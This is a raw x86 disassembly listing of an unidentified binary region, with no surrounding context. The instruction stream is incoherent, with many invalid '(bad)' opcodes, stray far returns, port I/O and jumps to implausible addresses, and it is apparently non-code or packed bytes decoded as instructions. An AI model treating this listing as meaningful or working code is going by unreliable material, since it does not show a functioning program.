  417a3a:	inc    DWORD PTR [eax]
  417a3c:	in     eax,dx
  417a3d:	add    al,bl
  417a3f:	jne    0x4179c6
  417a41:	mov    edi,edi
  417a43:	cld    
  417a44:	inc    DWORD PTR [ebp-0x12]
  417a47:	mov    esp,esp
  417a49:	mov    ah,0x85
  417a4b:	add    bh,bh
  417a4d:	call   0x119a351
  417a52:	ret    0x858b
  417a55:	cld    
  417a56:	inc    DWORD PTR [eax+0xe301ff]
  417a5c:	out    dx,al
  417a5d:	xor    BYTE PTR [ebp-0xff00cf],al
  417a63:	mov    ebx,ebp
  417a65:	cld    
  417a66:	jo     0x4179f1
  417a68:	or     DWORD PTR [ecx],eax
  417a6a:	add    BYTE PTR [eax],al
  417a6c:	push   eax
  417a6d:	add    DWORD PTR [ebp+0x45],eax
  417a70:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  417a76:	dec    DWORD PTR [ebx-0x3fda0318]
  417a7c:	add    BYTE PTR [ebp-0xbf0040],dl
  417a82:	inc    ebp
  417a83:	or     BYTE PTR [ebx-0x4faf0400],0x45
  417a8a:	add    DWORD PTR [ebx+0x459c00],ecx
  417a90:	mov    edi,edi
  417a92:	mov    eax,0xe80800ff
  417a97:	inc    ebp
  417a98:	sub    BYTE PTR [ebx-0x47000400],cl
  417a9e:	add    al,0x1
  417aa0:	rol    BYTE PTR [eax],0x1e
  417aa3:	jne    0x417aea
  417aa5:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  417aab:	inc    DWORD PTR [ecx]
  417aad:	call   0x86a2b2
  417ab2:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  417ab8:	call   0x41a2be
  417abd:	xor    bh,bh
  417abf:	push   edi
  417ac0:	adc    BYTE PTR [ebx-0x747423bb],al
  417ac6:	loopne 0x417aa4
  417ac8:	ret    
  417ac9:	loopne 0x417a67
  417acb:	xor    DWORD PTR [edx],0x31
  417ace:	cmp    edi,edi
  417ad0:	bswap  esp
  417ad2:	rol    BYTE PTR gs:[eax],0x5
  417ad6:	jmp    0x12c7c20
  417adb:	mov    eax,DWORD PTR [ebp-0x4]
  417ade:	add    BYTE PTR [eax+0xff0100],bh
  417ae4:	cld    
  417ae5:	jne    0x417b64
  417ae7:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  417aed:	push   ss
  417aee:	add    DWORD PTR [eax],eax
  417af0:	add    BYTE PTR [eax+0x7f],dl
  417af3:	inc    ebp
  417af4:	add    BYTE PTR [ebx+0x459850],cl
  417afa:	mov    edi,edi
  417afc:	test   al,0xff
  417afe:	add    BYTE PTR [eax],cl
  417b00:	inc    DWORD PTR [ebp-0x18]
  417b03:	jmp    DWORD PTR ds:0x4d7d00dc
  417b09:	adc    BYTE PTR [ebx+0x459cb9],cl
  417b0f:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  417b15:	pushf  
  417b16:	mov    eax,0x30132
  417b1b:	lea    esi,[ebp+0x2c]
  417b1e:	xor    edi,edi
  417b20:	(bad)  
  417b21:	call   0x140a28e
  417b26:	call   0x135a3b6
  417b2b:	jne    0x417ab8
  417b2d:	xor    edi,esp
  417b2f:	add    eax,DWORD PTR [eax+0xc018d]
  417b35:	push   DWORD PTR [eax]
  417b37:	call   0xcaa293
  417b3c:	int3   
  417b3d:	inc    DWORD PTR [ebp-0x14]
  417b40:	mov    ecx,DWORD PTR [ebp-0x28]
  417b43:	xor    eax,DWORD PTR [eax]
  417b45:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  417b4b:	(bad)  
  417b4c:	xchg   ebp,eax
  417b4d:	in     al,0xff
  417b4f:	add    bh,bh
  417b51:	add    BYTE PTR [ebp+0x45],dl
  417b54:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  417b5a:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  417b61:	mov    edi,edi
  417b63:	or     BYTE PTR [eax],cl
  417b65:	inc    ebp
  417b66:	test   DWORD PTR gs:[eax],eax
  417b69:	je     0x417bb0
  417b6b:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  417b71:	xor    edx,DWORD PTR [eax-0x73]
  417b74:	push   ebp
  417b75:	or     BYTE PTR [ebp+0x21007572],al
  417b7b:	inc    ebp
  417b7c:	in     al,dx
  417b7d:	mov    ebp,DWORD PTR [eax]
  417b7f:	mov    esp,0x648bc345
  417b84:	fmul   st,st(5)
  417b86:	add    BYTE PTR [ebx],ch
  417b88:	mov    eax,DWORD PTR [ebx]
  417b8a:	cld    
  417b8b:	loopne 0x417b4d
  417b8d:	inc    ebp
  417b8e:	push   ebp
  417b8f:	cmp    ebp,eax
  417b91:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  417b98:	cld    
  417b99:	fadd   DWORD PTR [eax+0x3b014d]
  417b9f:	jne    0x417bd1
  417ba1:	push   0xf8898557
  417ba6:	in     al,dx
  417ba7:	jne    0x417bee
  417ba9:	lea    eax,[ebx+0x72e8dcc8]
  417baf:	das    
  417bb0:	mov    eax,DWORD PTR [eax]
  417bb2:	mov    esp,0x33eb7545
  417bb7:	mov    edi,DWORD PTR [edi+0x4572bc]
  417bbd:	xor    eax,edi
  417bbf:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  417bc9:	rcl    BYTE PTR [eax-0x40],1
  417bcc:	inc    ebp
  417bcd:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  417bd5:	inc    ebp
  417bd6:	xchg   ebp,eax
  417bd7:	ud0    ebp,DWORD PTR [ebx]
  417bda:	inc    DWORD PTR [eax]
  417bdc:	retf   
  417bdd:	jbe    0x417bdf
  417bdf:	mov    dl,BYTE PTR [eax-0x80]
  417be2:	push   ebp
  417be3:	pop    ds
  417be4:	mov    ecx,DWORD PTR [esp+esi*8]
  417be7:	inc    eax
  417be8:	retf   
  417be9:	inc    ebp
  417bea:	iret   
  417beb:	jb     0x417bb5
  417bed:	mov    eax,DWORD PTR [edi]
  417bef:	enter  0x4545,0x1
  417bf3:	xor    DWORD PTR [eax],eax
  417bf5:	pushf  
  417bf6:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  417bfc:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  417c03:	dec    ebp
  417c04:	add    BYTE PTR [ebx],dh
  417c06:	inc    ebp
  417c07:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  417c0d:	xor    dl,BYTE PTR [edx]
  417c0f:	add    eax,DWORD PTR [ebp-0x77]
  417c12:	mov    eax,esp
  417c14:	fmul   DWORD PTR [ebp-0x3d]
  417c17:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  417c1e:	mov    DWORD PTR [ebp-0x28],eax
  417c21:	rol    DWORD PTR [ebp-0x64],1
  417c24:	xor    eax,edi
  417c26:	mov    ecx,0xff858db0
  417c2b:	clc    
  417c2c:	enter  0x4d45,0x32
  417c30:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  417c37:	test   esi,edi
  417c39:	clc    
  417c3a:	inc    DWORD PTR [ebp+0x45]
  417c3d:	cmp    al,0x8b
  417c3f:	pushf  
  417c40:	or     bh,al
  417c42:	enter  0x16a8,0x85
  417c46:	xor    eax,edi
  417c48:	pushf  
  417c49:	inc    ebp
  417c4a:	(bad)  
  417c4b:	ds cld 
  417c4d:	pushf  
  417c4e:	inc    ebp
  417c4f:	mov    edx,DWORD PTR [eax-0x28]
  417c52:	lock push ebp
  417c54:	add    BYTE PTR [ebx],dh
  417c56:	mov    DWORD PTR [ebx],eax
  417c58:	sar    BYTE PTR [ebx],1
  417c5a:	adc    BYTE PTR [edi],cl
  417c5c:	dec    ebp
  417c5d:	adc    al,0x8b
  417c5f:	add    al,dl
  417c61:	jmp    0x1027e31
  417c66:	jb     0x417cb5
  417c68:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  417c6e:	xor    ecx,DWORD PTR [ebp+0x3b]
  417c71:	xor    ecx,DWORD PTR [edi]
  417c73:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  417c77:	(bad)  
  417c79:	clc    
  417c7a:	enter  0x8400,0x8b
  417c7e:	pop    es
  417c7f:	mov    al,0x0
  417c81:	push   ebp
  417c82:	push   cs
  417c83:	xor    ecx,eax
  417c85:	xor    esp,ecx
  417c87:	add    ebp,DWORD PTR [eax]
  417c89:	add    esi,DWORD PTR [eax]
  417c8b:	(bad)  
  417c8d:	retf   0x55c8
  417c90:	repnz mov eax,DWORD PTR [ebp-0x10]
  417c94:	(bad)  
  417c95:	cli    
  417c96:	fdivr  st,st(1)
  417c98:	test   DWORD PTR [eax+edi*8],ecx
  417c9b:	dec    ebp
  417c9c:	inc    ebp
  417c9d:	xor    edi,DWORD PTR [eax-0x7167afd]
  417ca3:	add    BYTE PTR [ebp+0x0],al
  417ca6:	mov    ecx,DWORD PTR [ebp-0x28]
  417ca9:	mov    ecx,ebx
  417cab:	clc    
  417cac:	jne    0x417c79
  417cae:	mov    esi,0xd672d3
  417cb3:	into   
  417cb4:	into   
  417cb5:	scas   eax,DWORD PTR es:[edi]
  417cb6:	dec    ebp
  417cb7:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  417cbd:	sub    ecx,esi
  417cbf:	cmp    ecx,DWORD PTR [ebp+0x77]
  417cc2:	(bad)  
  417cc3:	mov    edi,eax
  417cc5:	mov    al,0x85
  417cc7:	mov    eax,edi
  417cc9:	add    BYTE PTR [ebp-0x75],al
  417ccc:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  417cd3:	xor    eax,DWORD PTR [ebp+0x4503f803]
  417cd9:	(bad)  
  417cdb:	retf   0x559c
  417cde:	(bad)  
  417cdf:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  417ce6:	inc    ebp
  417ce7:	add    eax,0xeb9c4d3f
  417cec:	(bad)  
  417ced:	mov    ecx,esp
  417cef:	lods   al,BYTE PTR ds:[esi]
  417cf0:	test   DWORD PTR [ebp-0x8],edx
  417cf3:	xor    ecx,DWORD PTR [ebp+0x33]
  417cf6:	mov    eax,DWORD PTR [ebx]
  417cf8:	lock add ecx,ebx
  417cfb:	bswap  esi
  417cfd:	retf   0x55d1
  417d00:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  417d06:	jmp    0x417d01
  417d08:	add    BYTE PTR ds:0xebc44d8b,al
  417d0e:	push   ebp
  417d0f:	mov    ebp,DWORD PTR [ebx]
  417d11:	test   al,0x8b
  417d13:	push   ebp
  417d14:	clc    
  417d15:	xor    ecx,ebx
  417d17:	xor    ecx,esi
  417d19:	add    edx,ecx
  417d1b:	add    eax,DWORD PTR [edx+0xca010f]
  417d21:	push   ebp
  417d22:	dec    ebp
  417d23:	mov    ecx,DWORD PTR [ebx-0x34050710]
  417d29:	stc    
  417d2a:	rol    DWORD PTR ds:0xebce4dd6,cl
  417d30:	scas   eax,DWORD PTR es:[edi]
  417d31:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  417d37:	xor    ebp,DWORD PTR [ebx]
  417d39:	xor    edi,DWORD PTR [ebx]
  417d3b:	add    esi,DWORD PTR [edi+0x3]
  417d3e:	mov    ecx,DWORD PTR [edi]
  417d40:	clc    
  417d41:	retf   0x55cb
  417d44:	into   
  417d45:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  417d4c:	mov    eax,0x3376554d
  417d51:	mov    esi,DWORD PTR [ebx]
  417d53:	int3   
  417d54:	add    edx,DWORD PTR [ebp+0x3]
  417d57:	xor    ecx,DWORD PTR [edi]
  417d59:	xor    ecx,edx
  417d5b:	add    edx,DWORD PTR [ebp+0x3]
  417d5e:	mov    ecx,DWORD PTR [edi]
  417d60:	lock retf 0x4dfa
  417d64:	stc    
  417d65:	mov    ecx,DWORD PTR [eax]
  417d67:	or     BYTE PTR [ebp+0x4d],cl
  417d6a:	jmp    0x1057dfa
  417d6f:	dec    ebp
  417d70:	dec    ebp
  417d71:	(bad)  
  417d72:	mov    ebx,esp
  417d74:	clc    
  417d75:	test   ebx,ecx
  417d77:	clc    
  417d78:	ror    DWORD PTR [ebp-0x2a],cl
  417d7b:	mov    esi,ecx
  417d7d:	call   0x33ccc331
  417d82:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  417d89:	retf   
  417d8a:	ja     0x417d5a
  417d8c:	mov    ebp,DWORD PTR [eax-0x48]
  417d8f:	dec    ebp
  417d90:	xor    ecx,DWORD PTR [di+0x3]
  417d94:	mov    esp,esp
  417d96:	clc    
  417d97:	push   ebp
  417d98:	retf   
  417d99:	mov    dl,bl
  417d9b:	adc    esi,edx
  417d9d:	jb     0x417d6d
  417d9f:	add    BYTE PTR [edi-0x3b7474b3],ch
  417da5:	call   0x4d6d4927
  417daa:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  417db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417db1:	pushf  
  417db2:	inc    ebp
  417db3:	xor    cl,BYTE PTR [ebp-0x78]
  417db6:	mov    edx,edi
  417db8:	clc    
  417db9:	dec    ebp
  417dba:	retf   
  417dbb:	mov    edx,ebx
  417dbd:	call   0x56105198
  417dc2:	scas   eax,DWORD PTR es:[edi]
  417dc3:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  417dc9:	pushf  
  417dca:	sub    esi,DWORD PTR [edx]
  417dcc:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  417dd2:	lods   al,BYTE PTR ds:[esi]
  417dd3:	xor    esp,DWORD PTR [ebx]
  417dd5:	add    ecx,DWORD PTR [ebp-0x1c]
  417dd8:	mov    edi,DWORD PTR [ebp-0x8]
  417ddb:	mov    bl,cl
  417ddd:	cmp    dl,bl
  417ddf:	jb     0x417daf
  417de1:	add    dh,dl
  417de3:	dec    ebp
  417de4:	scas   eax,DWORD PTR es:[edi]
  417de5:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  417deb:	shr    DWORD PTR [ebx],cl
  417ded:	into   
  417dee:	cmp    edx,esi
  417df0:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  417df6:	dec    ebp
  417df7:	dec    ebp
  417df8:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  417dfe:	retf   
  417dff:	xor    edx,esi
  417e01:	add    ecx,esi
  417e03:	imul   ecx,edx
  417e06:	mov    DWORD PTR [ebp+0x8],edx
  417e09:	xor    ecx,DWORD PTR [ebp+0x2b]
  417e0c:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  417e12:	add    esi,DWORD PTR [ebx]
  417e14:	mov    ah,0x3
  417e16:	inc    ebp
  417e17:	rdtsc  
  417e19:	xlat   BYTE PTR ds:[ebx]
  417e1a:	pushf  
  417e1b:	jge    0x417da6
  417e1d:	xor    ebx,eax
  417e1f:	sub    eax,DWORD PTR [ebp-0x73]
  417e22:	(bad)  
  417e23:	cmp    al,al
  417e25:	jb     0x417dac
  417e27:	add    al,bh
  417e29:	ror    DWORD PTR [ebp-0x7a],1
  417e2c:	xor    edi,edi
  417e2e:	add    edi,edi
  417e30:	jmp    0x417e7f
  417e32:	mov    ecx,DWORD PTR [ebx-0x34341324]
  417e38:	dec    ebp
  417e39:	into   
  417e3a:	mov    ebp,DWORD PTR [edi-0x23737428]
  417e40:	pushf  
  417e41:	shl    DWORD PTR [edx],cl
  417e43:	retf   0x5588
  417e46:	or     ecx,DWORD PTR [ebp+0x7233114d]
  417e4c:	add    eax,DWORD PTR [eax]
  417e4e:	in     al,0x4d
  417e50:	push   ebp
  417e51:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  417e57:	fs add ch,cl
  417e5a:	dec    ebp
  417e5b:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  417e61:	dec    ebp
  417e62:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  417e68:	jge    0x417e38
  417e6a:	mov    BYTE PTR [edi+0xf723b3a],ch
  417e70:	add    cl,dh
  417e72:	dec    ebp
  417e73:	dec    DWORD PTR [ebx-0x2c032375]
  417e79:	adc    BYTE PTR [ebp+0x1],0x8b
  417e7d:	add    al,bl
  417e7f:	jge    0x417e0d
  417e81:	push   0xffffff9c
  417e83:	push   0x8b3032
  417e88:	shl    BYTE PTR [ebp+0x55],0x6a
  417e8c:	xor    edi,edi
  417e8e:	xor    edx,DWORD PTR [ebx+eax*1]
  417e91:	inc    ebp
  417e92:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  417e98:	dec    ebp
  417e99:	or     BYTE PTR [ecx+0x4dc8e483],cl
  417e9f:	jbe    0x417e2c
  417ea1:	mov    ebp,esp
  417ea3:	ror    bl,1
  417ea5:	enter  0x14ce,0xaf
  417ea9:	dec    DWORD PTR [ebx-0x2cef17f8]
  417eaf:	push   ebp
  417eb0:	retf   0x5540
  417eb3:	push   ebp
  417eb4:	mov    esi,DWORD PTR [edx-0x1c]
  417eb7:	mov    edx,ebx
  417eb9:	cld    
  417eba:	(bad)  
  417ebb:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  417ec2:	sti    
  417ec3:	add    dh,cl
  417ec5:	push   0xffffff94
  417ec7:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  417ece:	bswap  esp
  417ed0:	pop    esi
  417ed1:	inc    ebp
  417ed2:	dec    DWORD PTR [ecx+0x45e8c88b]
  417ed8:	push   ebp
  417ed9:	xor    esi,DWORD PTR [ebx]
  417edb:	mov    DWORD PTR [ebx],0xcac00f9c
  417ee1:	aas    
  417ee2:	push   ebp
  417ee3:	inc    ebp
  417ee4:	xor    ecx,eax
  417ee6:	add    ecx,eax
  417ee8:	mov    eax,DWORD PTR [ebx]
  417eea:	(bad)  
  417eeb:	jmp    0x417e79
  417eed:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  417ef4:	les    edi,FWORD PTR [esi-0xeccefb3]
  417efa:	mov    edx,0xff378d80
  417eff:	mov    dh,0xd1
  417f01:	cmp    edx,DWORD PTR [ebp+0xf]
  417f04:	mov    eax,DWORD PTR [edx-0x20]
  417f07:	add    BYTE PTR [ebp-0x75],bh
  417f0a:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  417f11:	pushf  
  417f12:	retf   0x8632
  417f15:	cmp    ebp,0x8
  417f18:	call   ebx
  417f1a:	inc    ebp
  417f1b:	inc    ebp
  417f1c:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  417f22:	mov    esi,DWORD PTR [ecx]
  417f24:	enter  0x49c,0xc7
  417f28:	add    al,al
  417f2a:	add    bl,al
  417f2c:	(bad)  
  417f2d:	clc    
  417f2e:	enter  0x45,0x31
  417f32:	push   eax
  417f33:	pushf  
  417f34:	mov    edi,eax
  417f36:	int3   
  417f37:	or     al,al
  417f39:	test   DWORD PTR [edi],edi
  417f3b:	clc    
  417f3c:	gs inc ebp
  417f3e:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  417f44:	push   ss
  417f45:	xor    ecx,DWORD PTR [ebp+0x3]
  417f48:	sub    edx,DWORD PTR [ecx-0x76]
  417f4b:	dec    ebp
  417f4c:	add    DWORD PTR [ebx+0x88d845],ecx
  417f52:	mov    esi,DWORD PTR [ebx]
  417f54:	or     BYTE PTR [ebx],al
  417f56:	cmp    edx,DWORD PTR [ecx-0x38]
  417f59:	dec    ebp
  417f5a:	out    dx,eax
  417f5b:	xor    eax,DWORD PTR [ebp+0x3]
  417f5e:	mov    edx,DWORD PTR [ecx-0x28]
  417f61:	dec    ebp
  417f62:	add    BYTE PTR [ebx],dh
  417f64:	push   0x518003
  417f69:	push   eax
  417f6a:	add    BYTE PTR [ebx-0x300748b],cl
  417f70:	sbb    BYTE PTR [ebp+0x45],cl
  417f73:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  417f79:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  417f7f:	dec    ebp
  417f80:	inc    ebp
  417f81:	xor    ecx,eax
  417f83:	add    ecx,eax
  417f85:	push   ecx
  417f86:	(bad)  
  417f87:	dec    ebp
  417f88:	mov    al,ds:0xc5e03dff
  417f8d:	retf   
  417f8e:	(bad)  
  417f8f:	into   
  417f90:	sub    bh,bh
  417f92:	dec    esp
  417f93:	adc    al,0x9c
  417f95:	inc    ebp
  417f96:	push   ebp
  417f97:	test   DWORD PTR [edi],ecx
  417f99:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  417fa0:	jmp    0xc9ba8eb4
  417fa5:	add    cl,dl
  417fa7:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  417fb1:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  417fb7:	rol    BYTE PTR [eax],0x55
  417fba:	clc    
  417fbb:	fs jb  0x417fc5
  417fbe:	mov    eax,DWORD PTR [ebp-0x30]
  417fc1:	xor    al,0x40
  417fc3:	sub    al,0xc7
  417fc5:	mov    ah,ch
  417fc7:	add    DWORD PTR [ebp+0x4534f845],eax
  417fcd:	sub    al,0x86
  417fcf:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  417fd6:	mov    ch,0xff
  417fd8:	clc    
  417fd9:	add    DWORD PTR [ebp+0x60],0x3d
  417fdd:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  417fe4:	inc    ebp
  417fe5:	dec    DWORD PTR [ebx-0x341ff701]
  417feb:	test   esi,ecx
  417fed:	dec    DWORD PTR [ebx-0x7f8a3301]
  417ff3:	push   eax
  417ff4:	add    DWORD PTR [ebp+0x0],eax
  417ff7:	dec    ebx
  417ff9:	or     al,0xce
  417ffb:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  418002:	into   
  418003:	add    BYTE PTR [ebx-0x34ff1400],cl
  418009:	mov    esi,ecx
  41800b:	sar    bh,0x45
  41800e:	adc    al,0x8b
  418010:	clc    
  418011:	fadd   DWORD PTR [ebp+0x0]
  418014:	mov    ebp,DWORD PTR [edx+0x8]
  418017:	push   edi
  418018:	adc    BYTE PTR [eax+0x1],0x83
  41801c:	add    al,al
  41801e:	retf   
  41801f:	mov    ecx,esi
  418021:	cld    
  418022:	mov    eax,DWORD PTR [eax+0xcb01cc]
  418028:	into   
  418029:	add    BYTE PTR [ebx+0x756aec00],cl
  41802f:	jne    0x418064
  418031:	inc    DWORD PTR [ebx]
  418033:	rcl    BYTE PTR [ecx+0x50],1
  418036:	push   eax
  418037:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  41803d:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  418044:	sar    bh,0x84
  418047:	or     BYTE PTR [ebx],al
  418049:	push   eax
  41804a:	add    BYTE PTR [ebx+0x4532c845],cl
  418050:	pushf  
  418051:	xor    edi,eax
  418053:	pushf  
  418054:	mov    ah,0x89
  418056:	test   eax,ebp
  418058:	clc    
  418059:	inc    ebp
  41805a:	inc    ebp
  41805b:	mov    DWORD PTR [eax+eax*8],esi
  41805e:	sub    al,0x30
  418060:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  418067:	dec    ebp
  418068:	xor    eax,DWORD PTR fs:[edi+0x3]
  41806c:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  418072:	xor    eax,DWORD PTR fs:[edi+0x3]
  418076:	or     DWORD PTR [ecx+0x45ff085c],0x0
  41807d:	shl    DWORD PTR [ebp-0x380064],1
  418083:	int3   
  418084:	lea    eax,[ebp+0x45fff860]
  41808a:	push   eax
  41808b:	xor    dh,BYTE PTR [ebp-0x64]
  41808e:	(bad)  
  41808f:	(bad)  
  418090:	pop    esp
  418091:	lods   al,BYTE PTR ds:[esi]
  418092:	inc    DWORD PTR [ebp+0x4508f8ff]
  418098:	mov    edi,DWORD PTR [eax+edx*8]
  41809b:	pushf  
  41809c:	jo     0x418065
  41809e:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  4180a5:	inc    ebp
  4180a6:	add    BYTE PTR [esi],bh
  4180a8:	push   0x8b809c
  4180ad:	in     al,dx
  4180ae:	inc    ebp
  4180af:	push   ebp
  4180b0:	mov    esi,DWORD PTR [ebx]
  4180b2:	cld    
  4180b3:	add    eax,DWORD PTR [eax+0xf013b]
  4180b9:	adc    al,0x0
  4180bb:	add    bh,bh
  4180bd:	jmp    0xbe81da
  4180c2:	add    BYTE PTR [ebp+0x45],cl
  4180c5:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  4180cb:	dec    ebp
  4180cc:	push   0x38033
  4180d1:	cmp    eax,DWORD PTR [eax]
  4180d3:	unpcklps xmm7,xmm0
  4180d6:	jne    0x4180d8
  4180d8:	dec    DWORD PTR [ebx+0x5545cc18]
  4180de:	mov    DWORD PTR [ebx],esi
  4180e0:	shl    BYTE PTR [ebx],1
  4180e2:	inc    ebp
  4180e3:	add    ecx,DWORD PTR [ecx+0x60fc803]
  4180e9:	retf   0x5575
  4180ec:	dec    DWORD PTR [ebx-0x5ba17e8]
  4180f2:	(bad)  
  4180f3:	stc    
  4180f4:	in     al,dx
  4180f5:	or     al,0x85
  4180f7:	dec    ebp
  4180f8:	clc    
  4180f9:	xor    eax,DWORD PTR [ebp+0x3]
  4180fc:	mov    ebp,ecx
  4180fe:	rol    BYTE PTR [eax],1
  418100:	inc    ebp
  418101:	add    BYTE PTR [eax-0x7747ab3],bh
  418107:	clc    
  418108:	inc    ebp
  418109:	retf   
  41810a:	mov    edx,ebx
  41810c:	in     al,dx
  41810d:	(bad)  
  41810e:	retf   
  41810f:	into   
  418110:	into   
  418111:	scas   eax,DWORD PTR es:[edi]
  418112:	dec    ebp
  418113:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  418119:	sub    ecx,esi
  41811b:	cmp    ecx,DWORD PTR [ebp+0x77]
  41811e:	(bad)  
  41811f:	mov    edi,eax
  418121:	int3   
  418122:	test   DWORD PTR [ecx-0x74baff08],ecx
  418128:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  41812f:	xor    eax,DWORD PTR [ebp+0x4503f803]
  418135:	(bad)  
  418137:	retf   0x559c
  41813a:	(bad)  
  41813b:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  418142:	inc    ebp
  418143:	add    eax,0xeb9c4d3f
  418148:	(bad)  
  418149:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  41814f:	xor    ecx,DWORD PTR [ebp+0x33]
  418152:	mov    eax,DWORD PTR [ebx]
  418154:	call   0xce514c5c
  418159:	retf   0x55d1
  41815c:	test   BYTE PTR [ebx-0x5ff17fe],cl
  418162:	jmp    0x41815d
  418164:	add    BYTE PTR ds:0xebf44d8b,al
  41816a:	push   ebp
  41816b:	mov    ebp,DWORD PTR [ebx]
  41816d:	mov    eax,0x33f8558b
  418172:	retf   
  418173:	xor    ecx,esi
  418175:	add    edx,ecx
  418177:	add    eax,DWORD PTR [edx+0xca010f]
  41817d:	push   ebp
  41817e:	dec    ebp
  41817f:	mov    ecx,DWORD PTR [ebx-0x34050718]
  418185:	stc    
  418186:	rol    DWORD PTR ds:0xebce4dd6,cl
  41818c:	scas   eax,DWORD PTR es:[edi]
  41818d:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  418193:	xor    ebp,DWORD PTR [ebx]
  418195:	xor    edi,DWORD PTR [ebx]
  418197:	add    esi,DWORD PTR [edi+0x3]
  41819a:	mov    ecx,DWORD PTR [edi]
  41819c:	clc    
  41819d:	retf   0x55cb
  4181a0:	into   
  4181a1:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  4181a8:	test   al,0x4d
  4181aa:	push   ebp
  4181ab:	jbe    0x4181e0
  4181ad:	mov    esi,DWORD PTR [ebx]
  4181af:	mov    al,0x3
  4181b1:	push   ebp
  4181b2:	add    esi,DWORD PTR [ebx]
  4181b4:	rdpmc  
  4181b6:	retf   0x5503
  4181b9:	add    ecx,DWORD PTR [ebx-0x53517f1]
  4181bf:	dec    ebp
  4181c0:	stc    
  4181c1:	mov    ecx,DWORD PTR [eax]
  4181c3:	or     BYTE PTR [ebp+0x4d],cl
  4181c6:	jmp    0x1358256
  4181cb:	dec    ebp
  4181cc:	dec    ebp
  4181cd:	(bad)  
  4181ce:	mov    ebx,esp
  4181d0:	clc    
  4181d1:	test   ebx,ecx
  4181d3:	clc    
  4181d4:	ror    DWORD PTR [ebp-0x2a],cl
  4181d7:	mov    esi,ecx
  4181d9:	lock scas eax,DWORD PTR es:[edi]
  4181db:	inc    ebp
  4181dc:	mov    esi,DWORD PTR [ebx]
  4181de:	hlt    
  4181df:	pushf  
  4181e0:	jge    0x41816d
  4181e2:	sub    ebx,esp
  4181e4:	cmp    ecx,ebx
  4181e6:	ja     0x4181b6
  4181e8:	mov    ebp,DWORD PTR [eax-0x58]
  4181eb:	dec    ebp
  4181ec:	xor    ecx,DWORD PTR [di+0x3]
  4181f0:	mov    esp,esp
  4181f2:	clc    
  4181f3:	push   ebp
  4181f4:	retf   
  4181f5:	mov    dl,bl
  4181f7:	adc    esi,edx
  4181f9:	jb     0x4181c9
  4181fb:	add    BYTE PTR [edi-0xb7474b3],ch
  418201:	lock jge 0x4181cf
  418204:	sub    ecx,DWORD PTR [ebp+0x3b]
  418207:	mov    esi,DWORD PTR [edi-0x20]
  41820a:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  418211:	mov    BYTE PTR [ebx-0x34b20729],cl
  418217:	mov    edx,ebx
  418219:	lock (bad) 
  41821b:	ror    esi,cl
  41821d:	push   ebp
  41821e:	scas   eax,DWORD PTR es:[edi]
  41821f:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  418225:	pushf  
  418226:	sub    esi,DWORD PTR [edx]
  418228:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  41822e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
